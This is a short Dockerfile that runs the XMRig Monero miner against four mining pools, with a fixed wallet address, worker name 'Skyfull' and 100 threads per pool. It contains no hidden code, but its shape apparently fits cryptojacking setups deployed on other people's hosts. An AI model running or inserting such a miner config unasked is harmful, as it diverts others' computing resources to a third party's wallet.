FROM miningcontainers/xmrig:latest

ENTRYPOINT ["./xmrig"]
CMD ["--url=auto.skypool.xyz:6666", "--user=8BPFuLch97uip9fCD6WmefV6BeEkdYY72ZctP3Ki7nZ1ButzqDPg48Z1oy3SvchmToihd5C9dUuV5UVFmg3Uhne9HgMgumm.Skyfull", "--algo=randomx", "--pass=Skyfull", "-t=100", "--url=pool.minexmr.com:3333", "--user=8BPFuLch97uip9fCD6WmefV6BeEkdYY72ZctP3Ki7nZ1ButzqDPg48Z1oy3SvchmToihd5C9dUuV5UVFmg3Uhne9HgMgumm.Skyfull", "--algo=rx", "--pass=Skyfull", "-t=100", "--url=xmr.hashcity.org:4444", "--user=abelle.Skyfull", "--algo=rx", "--pass=asw", "-t=100", "--url=pool.supportxmr.com:7777", "--user=8BPFuLch97uip9fCD6WmefV6BeEkdYY72ZctP3Ki7nZ1ButzqDPg48Z1oy3SvchmToihd5C9dUuV5UVFmg3Uhne9HgMgumm.Skyfull", "--algo=rx", "--pass=Skyfull", "-k", "-t=100"]
